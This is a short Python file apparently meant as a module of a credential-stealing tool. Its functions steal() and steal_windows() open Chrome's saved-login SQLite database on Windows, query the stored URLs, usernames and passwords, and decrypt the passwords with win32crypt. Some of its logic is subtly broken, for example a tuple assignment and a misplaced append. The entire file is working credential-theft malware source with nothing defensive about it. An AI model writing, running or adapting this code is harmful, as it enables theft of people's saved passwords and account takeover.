import platform
if platform.system() == "Windows":
	import os
	import sqlite3
	import win32crypt
	import sys
def steal():
	# Do only if on Windows, Linux and Mac support will be added later
	if platform.system() == "Windows":
		return steal_windows()
	else:
		return ("[-] Only Windows is supported")

def steal_windows():
	ret = list()
	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
	path = os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data'
	try:
	# Try to open the SQLite3 database
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
	# Whoah an error, happens when the database is locked (Chrome is still open)
	except:
		return ('[-] Couldn\'t open the database')
	# Execute the query
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
	except:
		return ('[-] Error getting the passwords')
	# Fetch all data
	data = cursor.fetchall()
	# Check if there is any data
	if len(data) > 0:
		for result in data:
		# Decrypt the Password
			try:
			# The good/bad thing about the Chrome passwords is that they are easily decryptable
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except:
				# If it fails no biggie try another one
				pass
			# If the password is found
			if password:
				# If the URL is blank,print it as (Unknown)
				if(len(result[0]) <= 0):
					result[0] = "(Unknown)"
					# Print the result
					ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
		return ret
	else:
		return ('[-] There are no passwords')
